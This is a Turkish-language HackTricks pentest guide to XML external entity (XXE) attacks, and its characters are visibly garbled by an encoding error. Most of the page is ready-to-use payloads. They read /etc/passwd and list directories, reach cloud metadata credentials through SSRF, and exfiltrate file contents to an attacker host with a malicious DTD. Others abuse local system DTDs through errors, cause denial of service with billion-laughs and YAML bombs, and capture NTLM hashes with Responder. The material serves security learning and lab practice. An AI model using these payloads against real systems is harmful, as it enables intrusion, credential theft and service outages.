# XXE - XEE - XML DÄ±ÅŸ VarlÄ±ÄŸÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** bizi **takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML Temelleri

XML, veri depolama ve taÅŸÄ±ma iÃ§in tasarlanmÄ±ÅŸ bir iÅŸaretleme dilidir ve aÃ§Ä±klayÄ±cÄ± ÅŸekilde adlandÄ±rÄ±lmÄ±ÅŸ etiketlerin kullanÄ±lmasÄ±na olanak tanÄ±yan esnek bir yapÄ±ya sahiptir. HTML'den, Ã¶nceden tanÄ±mlanmÄ±ÅŸ etiket seti ile sÄ±nÄ±rlÄ± olmamasÄ±yla ayrÄ±lÄ±r. JSON'un yÃ¼kseliÅŸi ile XML'in Ã¶nemi azalmÄ±ÅŸtÄ±r, buna raÄŸmen AJAX teknolojisindeki ilk rolÃ¼ Ã¶nemlidir.

* **VarlÄ±klar aracÄ±lÄ±ÄŸÄ±yla Veri Temsili**: XML'deki varlÄ±klar, `<` ve `>` ile Ã§eliÅŸmemek iÃ§in `&lt;` ve `&gt;` gibi Ã¶zel karakterlerin dahil edilmesi de dahil olmak Ã¼zere verilerin temsilini saÄŸlar.
* **XML ElemanlarÄ±nÄ± TanÄ±mlama**: XML, eleman tÃ¼rlerinin tanÄ±mlanmasÄ±na olanak tanÄ±r ve elemanlarÄ±n nasÄ±l yapÄ±landÄ±rÄ±lacaÄŸÄ±nÄ± ve hangi iÃ§eriÄŸi iÃ§erebileceÄŸini belirler; bu, her tÃ¼rlÃ¼ iÃ§erikten belirli alt elemanlara kadar deÄŸiÅŸebilir.
* **Belge TÃ¼rÃ¼ TanÄ±mÄ± (DTD)**: DTD'ler, XML'de belgenin yapÄ±sÄ±nÄ± ve iÃ§erebileceÄŸi veri tÃ¼rlerini tanÄ±mlamak iÃ§in kritik Ã¶neme sahiptir. DTD'ler iÃ§sel, dÄ±ÅŸsal veya bir kombinasyon olabilir ve belgelerin nasÄ±l biÃ§imlendirileceÄŸi ve doÄŸrulanacaÄŸÄ± konusunda rehberlik eder.
* **Ã–zel ve DÄ±ÅŸ VarlÄ±klar**: XML, esnek veri temsili iÃ§in bir DTD iÃ§inde Ã¶zel varlÄ±klarÄ±n oluÅŸturulmasÄ±nÄ± destekler. URL ile tanÄ±mlanan dÄ±ÅŸ varlÄ±klar, Ã¶zellikle XML DÄ±ÅŸ VarlÄ±k (XXE) saldÄ±rÄ±larÄ± baÄŸlamÄ±nda gÃ¼venlik endiÅŸeleri doÄŸurur; bu saldÄ±rÄ±lar, XML ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ±nÄ±n dÄ±ÅŸ veri kaynaklarÄ±nÄ± nasÄ±l iÅŸlediÄŸini istismar eder: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **Parametre VarlÄ±klarÄ± ile XXE Tespiti**: XXE zafiyetlerini tespit etmek iÃ§in, Ã¶zellikle geleneksel yÃ¶ntemlerin ayrÄ±ÅŸtÄ±rÄ±cÄ± gÃ¼venlik Ã¶nlemleri nedeniyle baÅŸarÄ±sÄ±z olduÄŸu durumlarda, XML parametre varlÄ±klarÄ± kullanÄ±labilir. Bu varlÄ±klar, zafiyeti doÄŸrulamak iÃ§in kontrol edilen bir alan adÄ±na DNS sorgularÄ± veya HTTP istekleri tetikleme gibi dÄ±ÅŸarÄ±dan tespit tekniklerine olanak tanÄ±r.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Ana saldÄ±rÄ±lar

[**Bu saldÄ±rÄ±larÄ±n Ã§oÄŸu, harika Portswiggers XEE laboratuvarlarÄ± kullanÄ±larak test edilmiÅŸtir: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Yeni VarlÄ±k testi

Bu saldÄ±rÄ±da basit bir yeni VARLIK beyanÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± test edeceÄŸim.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### Dosya oku

FarklÄ± yollarla `/etc/passwd` dosyasÄ±nÄ± okumayÄ± deneyelim. Windows iÃ§in ÅŸunu okumayÄ± deneyebilirsiniz: `C:\windows\system32\drivers\etc\hosts`

Bu ilk durumda, SYSTEM "_\*\*file:///\*\*etc/passwd_" ifadesinin de Ã§alÄ±ÅŸacaÄŸÄ±nÄ± unutmayÄ±n.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

Bu ikinci durum, web sunucusu PHP kullanÄ±yorsa bir dosya Ã§Ä±karmak iÃ§in faydalÄ± olmalÄ±dÄ±r (Portswigger laboratuvarlarÄ± durumu deÄŸil)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Bu Ã¼Ã§Ã¼ncÃ¼ durumda `Element stockCheck`'i ANY olarak tanÄ±mladÄ±ÄŸÄ±mÄ±za dikkat edin.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Dizin listeleme

**Java** tabanlÄ± uygulamalarda, bir yÃ¼k ile **bir dizinin iÃ§eriÄŸini listelemek** mÃ¼mkÃ¼n olabilir (dosya yerine sadece dizini istemek):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Bir XXE, bir bulut iÃ§indeki SSRF'yi kÃ¶tÃ¼ye kullanmak iÃ§in kullanÄ±labilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**Daha Ã¶nce bahsedilen teknik** kullanarak, sunucunun kontrol ettiÄŸiniz bir sunucuya eriÅŸmesini saÄŸlayarak zayÄ±f olduÄŸunu gÃ¶sterebilirsiniz. Ancak, bu iÅŸe yaramÄ±yorsa, belki de **XML varlÄ±klarÄ±na izin verilmediÄŸindendir**, bu durumda **XML parametre varlÄ±klarÄ±** kullanmayÄ± deneyebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Veriyi dÄ±ÅŸarÄ±ya sÄ±zdÄ±rma

**Bu durumda, sunucunun, bir dosyanÄ±n iÃ§eriÄŸini HTTP isteÄŸi aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderecek kÃ¶tÃ¼ niyetli bir yÃ¼k ile yeni bir DTD yÃ¼klemesini saÄŸlayacaÄŸÄ±z (Ã§ok satÄ±rlÄ± dosyalar iÃ§in, bunu dÄ±ÅŸarÄ±ya sÄ±zdÄ±rmayÄ± deneyebilirsiniz \_ftp://**\_ bu temel sunucuyu kullanarak Ã¶rneÄŸin [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Bu aÃ§Ä±klama,** [**Portswigger laboratuvarÄ±nda burada**](https://portswigger.net/web-security/xxe/blind)** temel alÄ±nmÄ±ÅŸtÄ±r.**

Verilen kÃ¶tÃ¼ niyetli DTD'de, veriyi dÄ±ÅŸarÄ±ya sÄ±zdÄ±rmak iÃ§in bir dizi adÄ±m gerÃ§ekleÅŸtirilir:

### KÃ¶tÃ¼ Niyetli DTD Ã–rneÄŸi:

YapÄ± ÅŸu ÅŸekildedir:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:

1. **Parametre VarlÄ±klarÄ±nÄ±n TanÄ±mÄ±:**
* Bir XML parametre varlÄ±ÄŸÄ±, `%file`, `/etc/hostname` dosyasÄ±nÄ±n iÃ§eriÄŸini okuyarak oluÅŸturulur.
* BaÅŸka bir XML parametre varlÄ±ÄŸÄ±, `%eval`, tanÄ±mlanÄ±r. Bu, dinamik olarak yeni bir XML parametre varlÄ±ÄŸÄ± olan `%exfiltrate`'i bildirir. `%exfiltrate` varlÄ±ÄŸÄ±, URL'nin sorgu dizesi iÃ§inde `%file` varlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini geÃ§irerek saldÄ±rganÄ±n sunucusuna bir HTTP isteÄŸi yapacak ÅŸekilde ayarlanÄ±r.
2. **VarlÄ±klarÄ±n Ä°crasÄ±:**
* `%eval` varlÄ±ÄŸÄ± kullanÄ±lÄ±r, bu da `%exfiltrate` varlÄ±ÄŸÄ±nÄ±n dinamik bildirimini gerÃ§ekleÅŸtirir.
* ArdÄ±ndan `%exfiltrate` varlÄ±ÄŸÄ± kullanÄ±lÄ±r, dosyanÄ±n iÃ§eriÄŸi ile belirtilen URL'ye bir HTTP isteÄŸi tetikler.

SaldÄ±rgan, bu kÃ¶tÃ¼ niyetli DTD'yi kontrolÃ¼ altÄ±ndaki bir sunucuda barÄ±ndÄ±rÄ±r, genellikle `http://web-attacker.com/malicious.dtd` gibi bir URL'de.

**XXE Payload:** ZayÄ±f bir uygulamayÄ± istismar etmek iÃ§in, saldÄ±rgan bir XXE payload gÃ¶nderir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu yÃ¼k, bir XML parametre varlÄ±ÄŸÄ± `%xxe` tanÄ±mlar ve bunu DTD iÃ§inde entegre eder. Bir XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ± tarafÄ±ndan iÅŸlendiÄŸinde, bu yÃ¼k, saldÄ±rganÄ±n sunucusundan dÄ±ÅŸ DTD'yi alÄ±r. ArdÄ±ndan, ayrÄ±ÅŸtÄ±rÄ±cÄ± DTD'yi satÄ±r iÃ§i olarak yorumlar, kÃ¶tÃ¼ niyetli DTD'de belirtilen adÄ±mlarÄ± yÃ¼rÃ¼tÃ¼r ve `/etc/hostname` dosyasÄ±nÄ±n saldÄ±rganÄ±n sunucusuna sÄ±zdÄ±rÄ±lmasÄ±na yol aÃ§ar.

### Hata TabanlÄ± (DÄ±ÅŸ DTD)

**Bu durumda, sunucunun bir hata mesajÄ± iÃ§inde bir dosyanÄ±n iÃ§eriÄŸini gÃ¶sterecek kÃ¶tÃ¼ niyetli bir DTD yÃ¼klemesini saÄŸlayacaÄŸÄ±z (bu, hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z geÃ§erlidir).** [**Buradan Ã¶rnek.**](https://portswigger.net/web-security/xxe/blind)

KÃ¶tÃ¼ niyetli bir dÄ±ÅŸ Belge TÃ¼rÃ¼ TanÄ±mÄ± (DTD) kullanÄ±larak, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini aÃ§Ä±ÄŸa Ã§Ä±karan bir XML ayrÄ±ÅŸtÄ±rma hata mesajÄ± tetiklenebilir. Bu, aÅŸaÄŸÄ±daki adÄ±mlar aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir:

1. `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini iÃ§eren `file` adÄ±nda bir XML parametre varlÄ±ÄŸÄ± tanÄ±mlanÄ±r.
2. `error` adÄ±nda baÅŸka bir XML parametre varlÄ±ÄŸÄ± iÃ§in dinamik bir tanÄ±m iÃ§eren `eval` adÄ±nda bir XML parametre varlÄ±ÄŸÄ± tanÄ±mlanÄ±r. Bu `error` varlÄ±ÄŸÄ± deÄŸerlendirildiÄŸinde, ismi olarak `file` varlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini iÃ§eren var olmayan bir dosyayÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±r.
3. `eval` varlÄ±ÄŸÄ± Ã§aÄŸrÄ±lÄ±r, bu da `error` varlÄ±ÄŸÄ±nÄ±n dinamik tanÄ±mÄ±na yol aÃ§ar.
4. `error` varlÄ±ÄŸÄ±nÄ±n Ã§aÄŸrÄ±lmasÄ±, var olmayan bir dosyayÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±r ve dosya adÄ± olarak `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini iÃ§eren bir hata mesajÄ± Ã¼retir.

KÃ¶tÃ¼ niyetli dÄ±ÅŸ DTD, aÅŸaÄŸÄ±daki XML ile Ã§aÄŸrÄ±labilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.

![](<../.gitbook/assets/image (809).png>)

_**LÃ¼tfen harici DTD'nin, bir varlÄ±ÄŸÄ± ikinci bir varlÄ±k iÃ§inde dahil etmemize izin verdiÄŸini, ancak bunun iÃ§ DTD'de yasaklandÄ±ÄŸÄ±nÄ± unutmayÄ±n. Bu nedenle, harici bir DTD kullanmadan (genellikle) bir hatayÄ± zorlayamazsÄ±nÄ±z.**_

### **Hata TabanlÄ± (sistem DTD)**

Peki, **dÄ±ÅŸa dÃ¶nÃ¼k etkileÅŸimlerin engellendiÄŸi** durumlarda kÃ¶r XXE zafiyetleri hakkÄ±nda ne dÃ¼ÅŸÃ¼nÃ¼yorsunuz (harici baÄŸlantÄ±lar mevcut deÄŸil)?

XML dil spesifikasyonundaki bir boÅŸluk, **bir belgenin DTD'si iÃ§ ve dÄ±ÅŸ bildirimleri birleÅŸtirdiÄŸinde hata mesajlarÄ± aracÄ±lÄ±ÄŸÄ±yla hassas verileri aÃ§Ä±ÄŸa Ã§Ä±karabilir**. Bu sorun, harici olarak tanÄ±mlanan varlÄ±klarÄ±n iÃ§ten yeniden tanÄ±mlanmasÄ±na olanak tanÄ±r ve hata tabanlÄ± XXE saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesini kolaylaÅŸtÄ±rÄ±r. Bu tÃ¼r saldÄ±rÄ±lar, harici bir DTD'de orijinal olarak tanÄ±mlanan bir XML parametre varlÄ±ÄŸÄ±nÄ±n iÃ§ DTD'den yeniden tanÄ±mlanmasÄ±nÄ± istismar eder. Sunucu tarafÄ±ndan dÄ±ÅŸa dÃ¶nÃ¼k baÄŸlantÄ±lar engellendiÄŸinde, saldÄ±rganlar saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in yerel DTD dosyalarÄ±na gÃ¼venmek zorundadÄ±r ve hassas bilgileri aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in bir ayrÄ±ÅŸtÄ±rma hatasÄ± indÃ¼klemeyi hedeflerler.

Sunucunun dosya sisteminde `/usr/local/app/schema.dtd` konumunda `custom_entity` adÄ±nda bir varlÄ±k tanÄ±mlayan bir DTD dosyasÄ± olduÄŸunu dÃ¼ÅŸÃ¼nÃ¼n. Bir saldÄ±rgan, aÅŸaÄŸÄ±daki gibi bir hibrit DTD gÃ¶ndererek `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini aÃ§Ä±ÄŸa Ã§Ä±karan bir XML ayrÄ±ÅŸtÄ±rma hatasÄ± indÃ¼kleyebilir:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
AÅŸaÄŸÄ±da belirtilen adÄ±mlar bu DTD tarafÄ±ndan yÃ¼rÃ¼tÃ¼lmektedir:

* `local_dtd` adlÄ± bir XML parametre varlÄ±ÄŸÄ±nÄ±n tanÄ±mÄ±, sunucunun dosya sisteminde bulunan dÄ±ÅŸ DTD dosyasÄ±nÄ± iÃ§erir.
* DÄ±ÅŸ DTD'de orijinal olarak tanÄ±mlanan `custom_entity` XML parametre varlÄ±ÄŸÄ± iÃ§in bir yeniden tanÄ±m yapÄ±lÄ±r; bu, bir [hata tabanlÄ± XXE istismarÄ±](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) kapsamak Ã¼zere tasarlanmÄ±ÅŸtÄ±r. Bu yeniden tanÄ±m, bir ayrÄ±ÅŸtÄ±rma hatasÄ± oluÅŸturmak iÃ§in tasarlanmÄ±ÅŸtÄ±r ve `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* `local_dtd` varlÄ±ÄŸÄ±nÄ± kullanarak, dÄ±ÅŸ DTD devreye alÄ±nÄ±r ve yeni tanÄ±mlanan `custom_entity`'yi kapsar. Bu eylemler dizisi, istismara yÃ¶nelik hata mesajÄ±nÄ±n iletilmesine neden olur.

**GerÃ§ek dÃ¼nya Ã¶rneÄŸi:** GNOME masaÃ¼stÃ¼ ortamÄ±nÄ± kullanan sistemler genellikle `/usr/share/yelp/dtd/docbookx.dtd` konumunda `ISOamso` adlÄ± bir varlÄ±k iÃ§eren bir DTD'ye sahiptir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

Bu teknik **iÃ§sel DTD kullanÄ±yorsa, Ã¶nce geÃ§erli bir tane bulmanÄ±z gerekir**. Bunu **sunucunun kullandÄ±ÄŸÄ± aynÄ± **Ä°ÅŸletim Sistemi / YazÄ±lÄ±mÄ±** yÃ¼kleyerek ve **bazÄ± varsayÄ±lan DTD'leri arayarak** veya sistemler iÃ§indeki **varsayÄ±lan DTD'lerin bir listesini alarak** ve bunlardan herhangi birinin var olup olmadÄ±ÄŸÄ±nÄ± **kontrol ederek** yapabilirsiniz:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind) adresini kontrol edin.

### Sistemdeki DTD'leri Bulma

AÅŸaÄŸÄ±daki harika github reposunda **sistemde mevcut olabilecek DTD'lerin yollarÄ±nÄ±** bulabilirsiniz:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

AyrÄ±ca, eÄŸer **kurban sisteminin Docker imajÄ±na** sahipseniz, aynÄ± repo iÃ§indeki aracÄ± kullanarak **imajÄ± tarayabilir** ve sistemde mevcut olan **DTD'lerin** yolunu **bulabilirsiniz**. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in [github'un Readme'sini](https://github.com/GoSecure/dtd-finder) okuyun.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Bu saldÄ±rÄ±nÄ±n daha derinlemesine bir aÃ§Ä±klamasÄ± iÃ§in, **Detectify'den** [**bu harika yazÄ±nÄ±n**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **ikinci bÃ¶lÃ¼mÃ¼ne** bakÄ±n.

**Microsoft Office belgelerini yÃ¼kleme yeteneÄŸi birÃ§ok web uygulamasÄ± tarafÄ±ndan sunulmaktadÄ±r**, bu belgelerden belirli ayrÄ±ntÄ±larÄ± Ã§Ä±karmaya devam eder. Ã–rneÄŸin, bir web uygulamasÄ± kullanÄ±cÄ±larÄ±n XLSX formatÄ±nda bir elektronik tablo yÃ¼kleyerek veri iÃ§e aktarmasÄ±na izin verebilir. AyrÄ±ÅŸtÄ±rÄ±cÄ±nÄ±n elektronik tablodan verileri Ã§Ä±karmasÄ± iÃ§in, en az bir XML dosyasÄ±nÄ± ayrÄ±ÅŸtÄ±rmasÄ± kaÃ§Ä±nÄ±lmazdÄ±r.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± test etmek iÃ§in, **bir XXE yÃ¼kÃ¼ iÃ§eren bir Microsoft Office dosyasÄ± oluÅŸturmak** gereklidir. Ä°lk adÄ±m, belgenin Ã§Ä±karÄ±labileceÄŸi boÅŸ bir dizin oluÅŸturmaktÄ±r.

Belge Ã§Ä±karÄ±ldÄ±ktan sonra, `./unzipped/word/document.xml` konumundaki XML dosyasÄ± tercih edilen bir metin dÃ¼zenleyicisinde (Ã¶rneÄŸin vim) aÃ§Ä±lmalÄ± ve dÃ¼zenlenmelidir. XML, genellikle bir HTTP isteÄŸi ile baÅŸlayan istenen XXE yÃ¼kÃ¼nÃ¼ iÃ§erecek ÅŸekilde deÄŸiÅŸtirilmelidir.

DeÄŸiÅŸtirilen XML satÄ±rlarÄ±, iki kÃ¶k XML nesnesinin arasÄ±na yerleÅŸtirilmelidir. URL'nin izlenebilir bir istek URL'si ile deÄŸiÅŸtirilmesi Ã¶nemlidir.

Son olarak, dosya kÃ¶tÃ¼ niyetli poc.docx dosyasÄ±nÄ± oluÅŸturmak iÃ§in sÄ±kÄ±ÅŸtÄ±rÄ±labilir. Daha Ã¶nce oluÅŸturulan "unzipped" dizininden aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:

ArtÄ±k oluÅŸturulan dosya potansiyel olarak savunmasÄ±z web uygulamasÄ±na yÃ¼klenebilir ve Burp Collaborator gÃ¼nlÃ¼klerinde bir isteÄŸin gÃ¶rÃ¼nmesi umulabilir.

### Jar: protocol

**jar** protokolÃ¼ yalnÄ±zca **Java uygulamalarÄ±** iÃ§inde eriÅŸilebilir hale getirilmiÅŸtir. Hem yerel hem de uzak dosyalar iÃ§in **PKZIP** arÅŸivinde (Ã¶rneÄŸin, `.zip`, `.jar`, vb.) dosya eriÅŸimini saÄŸlamak iÃ§in tasarlanmÄ±ÅŸtÄ±r.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP dosyalarÄ± iÃ§indeki dosyalara eriÅŸebilmek, **sistem DTD dosyalarÄ± aracÄ±lÄ±ÄŸÄ±yla XXE'yi istismar etmek iÃ§in sÃ¼per kullanÄ±ÅŸlÄ±dÄ±r.** [Sistem DTD dosyalarÄ±nÄ± nasÄ±l istismar edeceÄŸinizi Ã¶ÄŸrenmek iÃ§in bu bÃ¶lÃ¼me bakÄ±n](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

PKZIP arÅŸivindeki bir dosyaya jar protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla eriÅŸim sÃ¼reci birkaÃ§ adÄ±mdan oluÅŸur:

1. Belirtilen bir konumdan, Ã¶rneÄŸin `https://download.website.com/archive.zip`, zip arÅŸivini indirmek iÃ§in bir HTTP isteÄŸi yapÄ±lÄ±r.
2. ArÅŸivi iÃ§eren HTTP yanÄ±tÄ±, genellikle `/tmp/...` gibi bir konumda sistemde geÃ§ici olarak saklanÄ±r.
3. ArÅŸiv, iÃ§eriÄŸine eriÅŸmek iÃ§in Ã§Ä±karÄ±lÄ±r.
4. ArÅŸiv iÃ§indeki belirli dosya, `file.zip`, okunur.
5. Ä°ÅŸlemden sonra, bu sÃ¼reÃ§te oluÅŸturulan geÃ§ici dosyalar silinir.

Bu sÃ¼reci ikinci adÄ±mda kesmek iÃ§in ilginÃ§ bir teknik, arÅŸiv dosyasÄ±nÄ± sunarken sunucu baÄŸlantÄ±sÄ±nÄ± sonsuz bir sÃ¼re aÃ§Ä±k tutmaktÄ±r. Bu amaÃ§la [bu depodaki](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) araÃ§lar kullanÄ±labilir; bunlar arasÄ±nda bir Python sunucusu (`slow_http_server.py`) ve bir Java sunucusu (`slowserver.jar`) bulunmaktadÄ±r.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
GeÃ§ici bir dizine dosya yazmak, **yol geÃ§iÅŸi ile ilgili baÅŸka bir zafiyeti artÄ±rmaya yardÄ±mcÄ± olabilir** (yerel dosya dahil etme, ÅŸablon enjeksiyonu, XSLT RCE, serileÅŸtirme, vb. gibi).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Milyar Kahkaha SaldÄ±rÄ±sÄ±
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml SaldÄ±rÄ±sÄ±
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ä°kincil Patlama SaldÄ±rÄ±sÄ±

![](<../.gitbook/assets/image (527).png>)

#### NTML Alma

Windows sunucularÄ±nda, bir responder.py iÅŸleyicisi ayarlayarak web sunucusu kullanÄ±cÄ±sÄ±nÄ±n NTML hash'ini almak mÃ¼mkÃ¼ndÃ¼r:
```bash
Responder.py -I eth0 -v
```
ve aÅŸaÄŸÄ±daki isteÄŸi gÃ¶ndererek
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Sonra hashcat kullanarak hash'i kÄ±rmayÄ± deneyebilirsiniz.

